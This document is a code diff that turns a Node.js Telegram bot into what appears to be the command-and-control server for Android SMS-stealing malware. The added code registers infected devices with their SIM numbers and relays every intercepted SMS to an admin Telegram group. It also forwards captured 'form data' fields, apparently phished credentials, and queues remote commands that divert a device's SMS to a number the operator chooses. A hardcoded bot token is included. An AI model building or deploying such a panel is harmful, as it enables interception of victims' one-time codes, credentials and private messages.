@@ -1,243 +1,274 @@
-require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
-const http = require('http');
-const { Server } = require('socket.io');
+const fs = require('fs-extra');
+const path = require('path');
 
+// ===== CONFIG =====
+const BOT_TOKEN = '8258626986:AAGTj0drfA1WDK0XWBA8N1ecJdlMiykCvcA';
+const ADMIN_IDS = [-1003052053970];   // replace with your chat/group id
+const DEVELOPER = '@heck0bot';
+const PORT = 3000;
+
+// ===== STORAGE =====
+const STORAGE_DIR = path.join(__dirname, 'storage');
+fs.ensureDirSync(STORAGE_DIR);
+const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
+if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});
+
+// ===== EXPRESS APP =====
 const app = express();
-const server = http.createServer(app);
-const io = new Server(server);
+app.use(bodyParser.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
 
-const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_IDS = JSON.parse(process.env.ADMIN_IDS || '[]'); // Ensure it's an array
+// ===== TELEGRAM BOT =====
+const bot = new TelegramBot(BOT_TOKEN, {
+  polling: { interval: 500, autoStart: true }
+});
 
-if (!BOT_TOKEN) {
-    console.error('BOT_TOKEN is not set in .env file!');
-    process.exit(1);
+// ===== RUNTIME DATA =====
+const devices = new Map();
+const sessions = {};
+const notifiedDevices = new Set();
+
+// ===== UTILS =====
+function readQueue() {
+  return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {};
+}
+function writeQueue(q) {
+  fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 });
+}
+function addCommand(uuid, cmd) {
+  const q = readQueue();
+  q[uuid] = q[uuid] || [];
+  q[uuid].push(cmd);
+  writeQueue(q);
+}
+function formatDevice(d) {
+  const online = (Date.now() - (d.lastSeen || 0) < 60000);
+  return `📱 *${d.model || 'Unknown'}*
+🪪 SIM1: ${d.sim1 || 'N/A'}
+🪪 SIM2: ${d.sim2 || 'N/A'}
+🔋 Battery: ${d.battery || 'N/A'}%
+🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
+}
+function isAdmin(chatId) {
+  return ADMIN_IDS.includes(chatId);
 }
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// ===== ROUTES =====
+app.get('/', (_, res) => res.send('✅ Panel online'));
 
-app.use(bodyParser.json());
+// Device connect
+app.post('/connect', (req, res) => {
+  const { uuid, model, brand, battery, sim1, sim2 } = req.body;
+  if (!uuid) return res.status(400).send('missing uuid');
 
-// In-memory store for connected devices
-// In a real application, this would be a database
-const connectedDevices = {}; // deviceId -> { socketId, info, lastSeen, telegramChatId }
+  devices.set(uuid, { model, brand, battery, sim1, sim2, lastSeen: Date.now() });
 
-// --- Socket.IO for Android App Communication ---
-io.on('connection', (socket) => {
-    console.log('A new Android device connected:', socket.id);
+  if (!notifiedDevices.has(uuid)) {
+    const payload = `📲 *Device Connected*
+${formatDevice(devices.get(uuid))}
 
-    socket.on('register_device', (deviceInfo) => {
-        const deviceId = deviceInfo.deviceId; // Unique ID from Android app
-        connectedDevices[deviceId] = {
-            socketId: socket.id,
-            info: deviceInfo,
-            lastSeen: Date.now(),
-            telegramChatId: null // Will be set when user links device
-        };
-        console.log(`Device registered: ${deviceId}`);
-        // Notify admin about new device connection
-        ADMIN_IDS.forEach(adminId => {
-            bot.sendMessage(adminId, `New device connected: ${deviceInfo.deviceName} (${deviceInfo.deviceId})\nSIM: ${deviceInfo.simNumber}\nBattery: ${deviceInfo.batteryLevel}%`);
-        });
-        socket.emit('device_registered', { status: 'success', deviceId: deviceId });
-    });
+👨💻 Developer: ${DEVELOPER}`;
+    ADMIN_IDS.forEach(id => bot.sendMessage(id, payload, { parse_mode: 'Markdown' }).catch(() => { }));
+    notifiedDevices.add(uuid);
+  }
 
-    socket.on('device_update', (deviceInfo) => {
-        const deviceId = deviceInfo.deviceId;
-        if (connectedDevices[deviceId]) {
-            connectedDevices[deviceId].info = { ...connectedDevices[deviceId].info, ...deviceInfo };
-            connectedDevices[deviceId].lastSeen = Date.now();
-            console.log(`Device updated: ${deviceId}`);
-        }
-    });
-
-    socket.on('sms_received', (data) => {
-        const { deviceId, sender, message, simSlot } = data;
-        console.log(`SMS received from ${deviceId} (SIM ${simSlot}): ${sender} - ${message}`);
-        if (connectedDevices[deviceId] && connectedDevices[deviceId].telegramChatId) {
-            bot.sendMessage(connectedDevices[deviceId].telegramChatId, `SMS from ${sender} (SIM ${simSlot} on ${connectedDevices[deviceId].info.deviceName}): ${message}`);
-        }
-        // TODO: Implement SMS forwarding logic here if enabled for this device
-    });
-
-    socket.on('sms_sent_status', (data) => {
-        const { deviceId, status, messageId, error } = data;
-        console.log(`SMS sent status from ${deviceId}: ${status}`);
-        if (connectedDevices[deviceId] && connectedDevices[deviceId].telegramChatId) {
-            let response = `SMS send status for ${connectedDevices[deviceId].info.deviceName}: ${status}`;
-            if (error) response += `\nError: ${error}`;
-            bot.sendMessage(connectedDevices[deviceId].telegramChatId, response);
-        }
-    });
-
-    socket.on('list_sms_response', (data) => {
-        const { deviceId, simSlot, messages } = data;
-        console.log(`Received SMS list from ${deviceId} (SIM ${simSlot})`);
-        if (connectedDevices[deviceId] && connectedDevices[deviceId].telegramChatId) {
-            let response = `Last 10 SMS from ${connectedDevices[deviceId].info.deviceName} (SIM ${simSlot}):\n`;
-            if (messages.length === 0) {
-                response += "No messages found.";
-            } else {
-                messages.forEach(msg => {
-                    response += `\nFrom: ${msg.sender}\nMessage: ${msg.body}\nDate: ${new Date(msg.timestamp).toLocaleString()}\n---`;
-                });
-            }
-            bot.sendMessage(connectedDevices[deviceId].telegramChatId, response);
-        }
-    });
-
-    socket.on('disconnect', () => {
-        console.log('An Android device disconnected:', socket.id);
-        for (const deviceId in connectedDevices) {
-            if (connectedDevices[deviceId].socketId === socket.id) {
-                console.log(`Device ${deviceId} disconnected.`);
-                // Optionally notify admin
-                if (connectedDevices[deviceId].telegramChatId) {
-                    bot.sendMessage(connectedDevices[deviceId].telegramChatId, `Your device ${connectedDevices[deviceId].info.deviceName} has disconnected.`);
-                }
-                delete connectedDevices[deviceId];
-                break;
-            }
-        }
-    });
+  res.sendStatus(200);
 });
 
-// --- Telegram Bot Commands ---
-
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 'Welcome! Use /connect to link your device or /help for commands.');
+// Poll commands
+app.get('/commands', (req, res) => {
+  const uuid = req.query.uuid;
+  if (!uuid) return res.status(400).send('missing uuid');
+  const q = readQueue();
+  const cmds = q[uuid] || [];
+  q[uuid] = [];
+  writeQueue(q);
+  res.json(cmds);
 });
 
-bot.onText(/\/help/, (msg) => {
-    const chatId = msg.chat.id;
-    let helpMessage = `
-Available commands:
-/start - Welcome message
-/connect <deviceId> - Link your Telegram chat to a specific device ID (from Android app)
-/devices - List all connected devices
-/send_sms <deviceId> <simSlot> <phoneNumber> <message> - Send an SMS
-/get_sms <deviceId> <simSlot> - Get last 10 SMS from a SIM
-/forward_sms <deviceId> <enable|disable> [forwardNumber] - Manage SMS forwarding
-    `;
-    bot.sendMessage(chatId, helpMessage);
+// Incoming SMS
+app.post('/sms', (req, res) => {
+  const { uuid, from, body, sim, timestamp, battery } = req.body;
+  if (!uuid || !from || !body) return res.status(400).send('missing fields');
+
+  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
+  const ts = new Date(timestamp || Date.now());
+
+  const smsMsg = `📩 *New SMS*
+📱 Device: ${device.model}
+🔋 Battery: ${battery || 'N/A'}%
+From: ${from}
+SIM1: ${device.sim1}
+SIM2: ${device.sim2}
+Body: ${body}
+MessSIM: ${sim}
+Time: ${ts.toLocaleString()}
+👨💻 Developer: ${DEVELOPER}`;
+
+  ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMsg, { parse_mode: 'Markdown' }).catch(() => { }));
+
+  const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
+  const list = fs.existsSync(smsFile) ? fs.readJsonSync(smsFile) : [];
+  list.unshift({ from, body, sim, battery, timestamp: ts.getTime() });
+  fs.writeJsonSync(smsFile, list.slice(0, 500), { spaces: 2 });
+
+  res.sendStatus(200);
 });
 
-bot.onText(/\/connect (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const deviceId = match[1].trim();
+// HTML form data
+app.post('/html-form-data', (req, res) => {
+  const { uuid, ...fields } = req.body;
+  if (!uuid) return res.status(400).send('missing uuid');
 
-    if (connectedDevices[deviceId]) {
-        connectedDevices[deviceId].telegramChatId = chatId;
-        bot.sendMessage(chatId, `Successfully linked to device: ${connectedDevices[deviceId].info.deviceName} (${deviceId})`);
-        // Send a message to the device to confirm connection
-        io.to(connectedDevices[deviceId].socketId).emit('telegram_linked', { chatId: chatId });
-    } else {
-        bot.sendMessage(chatId, `Device ID "${deviceId}" not found or not connected. Make sure your Android app is running and registered.`);
-    }
+  const fp = path.join(STORAGE_DIR, `${uuid}.json`);
+  fs.writeJsonSync(fp, fields, { spaces: 2 });
+
+  const device = devices.get(uuid) || { model: uuid, brand: 'Unknown', battery: 'N/A' };
+
+  let msg = `🧾 *Form Submitted*
+📱 ${device.model}
+🏷 Brand: ${device.brand || 'Unknown'}
+🔋 Battery: ${device.battery || 'N/A'}%`;
+
+  for (let [k, v] of Object.entries(fields)) {
+    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+    msg += `\n🔸 *${label}*: ${v}`;
+  }
+
+  msg += `\n👨💻 Developer: ${DEVELOPER}`;
+
+  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => { }));
+
+  res.sendStatus(200);
 });
 
-bot.onText(/\/devices/, (msg) => {
-    const chatId = msg.chat.id;
-    let deviceList = 'Connected Devices:\n';
-    let foundDevices = false;
-    for (const deviceId in connectedDevices) {
-        foundDevices = true;
-        const device = connectedDevices[deviceId];
-        deviceList += `\nID: ${deviceId}\nName: ${device.info.deviceName}\nSIM: ${device.info.simNumber}\nBattery: ${device.info.batteryLevel}%\nLast Seen: ${new Date(device.lastSeen).toLocaleString()}\n`;
-        if (device.telegramChatId === chatId) {
-            deviceList += `(Linked to your chat)\n`;
-        } else if (device.telegramChatId) {
-            deviceList += `(Linked to another chat)\n`;
-        } else {
-            deviceList += `(Not linked to any chat)\n`;
-        }
-    }
-    if (!foundDevices) {
-        deviceList = 'No devices currently connected.';
-    }
-    bot.sendMessage(chatId, deviceList);
-});
+// ===== TELEGRAM BOT =====
+bot.on('message', msg => {
+  const chatId = msg.chat.id;
+  const text = (msg.text || '').trim();
 
-bot.onText(/\/send_sms (.+) (.+) (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const deviceId = match[1];
-    const simSlot = match[2];
-    const phoneNumber = match[3];
-    const message = match[4];
+  if (!isAdmin(chatId)) {
+    bot.sendMessage(chatId, '❌ Permission denied.');
+    return;
+  }
 
-    if (!connectedDevices[deviceId] || connectedDevices[deviceId].telegramChatId !== chatId) {
-        bot.sendMessage(chatId, `Device ${deviceId} not found or not linked to your chat.`);
-        return;
+  // Handle sessions
+  if (sessions[chatId]) {
+    const s = sessions[chatId];
+    if (s.stage === 'await_number' && s.action === 'sms_forward_on') {
+      const forwardTo = text;
+      addCommand(s.uuid, { type: 'sms_forward', action: 'on', sim: s.sim, number: forwardTo });
+      bot.sendMessage(chatId, `✅ SMS Forward ON SIM${s.sim} → ${forwardTo}\n👨💻 Developer: ${DEVELOPER}`);
+      delete sessions[chatId];
+      return;
     }
+  }
 
-    if (!['1', '2'].includes(simSlot)) {
-        bot.sendMessage(chatId, 'Invalid SIM slot. Use 1 or 2.');
-        return;
-    }
-
-    // Request Android app to send SMS
-    io.to(connectedDevices[deviceId].socketId).emit('send_sms', {
-        phoneNumber: phoneNumber,
-        message: message,
-        simSlot: parseInt(simSlot)
+  if (text === '/start') {
+    bot.sendMessage(chatId, '✅ Admin Panel Ready', {
+      reply_markup: {
+        keyboard: [['Connected devices'], ['SMS Forward']],
+        resize_keyboard: true
+      }
     });
-    bot.sendMessage(chatId, `Request to send SMS to ${phoneNumber} via ${connectedDevices[deviceId].info.deviceName} (SIM ${simSlot}) sent.`);
+  }
+
+  if (text === 'Connected devices') {
+    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
+    let out = '';
+    for (let [u, d] of devices.entries()) out += `${formatDevice(d)}\nUUID: `${u}`\n\n`;
+    bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
+  }
+
+  if (text === 'SMS Forward') {
+    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `sms_device:${uuid}` }]);
+    if (rows.length === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
+    bot.sendMessage(chatId, '📨 Select device for SMS Forward:', { reply_markup: { inline_keyboard: rows } });
+  }
 });
 
-bot.onText(/\/get_sms (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const deviceId = match[1];
-    const simSlot = match[2];
+// ===== INLINE CALLBACKS =====
+bot.on('callback_query', async cb => {
+  const chatId = cb.message.chat.id;
+  const data = cb.data;
 
-    if (!connectedDevices[deviceId] || connectedDevices[deviceId].telegramChatId !== chatId) {
-        bot.sendMessage(chatId, `Device ${deviceId} not found or not linked to your chat.`);
-        return;
+  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });
+
+  const [cmd, uuid] = data.split(':');
+  const device = devices.get(uuid);
+
+  switch (cmd) {
+    case 'sms_device': {
+      const buttons = [
+        [{ text: '📨 SMS Forward', callback_data: `sms_forward_menu:${uuid}` }],
+        [{ text: '⬅️ Back', callback_data: 'back_devices' }]
+      ];
+      return bot.editMessageText(`📨 SMS Commands for ${device?.model || uuid}\n👨💻 Developer: ${DEVELOPER}`, {
+        chat_id: chatId,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: buttons },
+        parse_mode: 'Markdown'
+      });
     }
 
-    if (!['1', '2'].includes(simSlot)) {
-        bot.sendMessage(chatId, 'Invalid SIM slot. Use 1 or 2.');
-        return;
+    case 'sms_forward_menu': {
+      const row = [
+        { text: 'SIM1', callback_data: `sms_forward_sim1:${uuid}` },
+        { text: 'SIM2', callback_data: `sms_forward_sim2:${uuid}` }
+      ];
+      return bot.editMessageText('📨 Choose SIM for SMS Forward:', {
+        chat_id: chatId,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [row, [{ text: '⬅️ Back', callback_data: `sms_forward_menu:${uuid}` }]] }
+      });
     }
 
-    // Request Android app to list SMS
-    io.to(connectedDevices[deviceId].socketId).emit('list_sms', {
-        simSlot: parseInt(simSlot)
-    });
-    bot.sendMessage(chatId, `Request to get last 10 SMS from ${connectedDevices[deviceId].info.deviceName} (SIM ${simSlot}) sent.`);
+    case 'sms_forward_sim1':
+    case 'sms_forward_sim2': {
+      const sim = cb.data.includes('sim2') ? 2 : 1;
+      const on = { text: 'Enable', callback_data: `sms_forward_on_sim${sim}:${uuid}` };
+      const off = { text: 'Disable', callback_data: `sms_forward_off_sim${sim}:${uuid}` };
+      return bot.editMessageText(`SMS Forward SIM${sim}:`, {
+        chat_id: chatId,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[on, off], [{ text: '⬅️ Back', callback_data: `sms_forward_menu:${uuid}` }]] }
+      });
+    }
+
+    case 'sms_forward_on_sim1':
+    case 'sms_forward_on_sim2': {
+      const sim = cb.data.includes('sim2') ? 2 : 1;
+      sessions[chatId] = { stage: 'await_number', action: 'sms_forward_on', sim, uuid };
+      bot.sendMessage(chatId, `📨 Enter number to forward SMS TO (SIM${sim}):`);
+      return bot.answerCallbackQuery(cb.id);
+    }
+
+    case 'sms_forward_off_sim1':
+    case 'sms_forward_off_sim2': {
+      const sim = cb.data.includes('sim2') ? 2 : 1;
+      addCommand(uuid, { type: 'sms_forward', action: 'off', sim });
+      bot.sendMessage(chatId, `✅ SMS Forward OFF SIM${sim}\n👨💻 Developer: ${DEVELOPER}`);
+      return bot.answerCallbackQuery(cb.id);
+    }
+
+    case 'back_devices': {
+      const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `sms_device:${uuid}` }]);
+      bot.editMessageText('📨 Select device for SMS Forward:', {
+        chat_id: chatId,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: rows }
+      });
+      return bot.answerCallbackQuery(cb.id);
+    }
+
+    default:
+      return bot.answerCallbackQuery(cb.id, { text: '❌ Unknown action' });
+  }
 });
 
-bot.onText(/\/forward_sms (.+) (enable|disable)(?: (.+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const deviceId = match[1];
-    const action = match[2]; // 'enable' or 'disable'
-    const forwardNumber = match[3]; // Optional for 'enable'
-
-    if (!connectedDevices[deviceId] || connectedDevices[deviceId].telegramChatId !== chatId) {
-        bot.sendMessage(chatId, `Device ${deviceId} not found or not linked to your chat.`);
-        return;
-    }
-
-    if (action === 'enable' && !forwardNumber) {
-        bot.sendMessage(chatId, 'Please provide a forward number when enabling SMS forwarding. Usage: /forward_sms <deviceId> enable <forwardNumber>');
-        return;
-    }
-
-    // Request Android app to manage SMS forwarding
-    io.to(connectedDevices[deviceId].socketId).emit('manage_sms_forwarding', {
-        action: action,
-        forwardNumber: forwardNumber
-    });
-    bot.sendMessage(chatId, `Request to ${action} SMS forwarding on ${connectedDevices[deviceId].info.deviceName} sent.`);
-});
-
-
-// --- Start Server ---
-server.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log('Telegram Bot started. Send /start to your bot.');
-});
+// ===== START SERVER =====
+app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
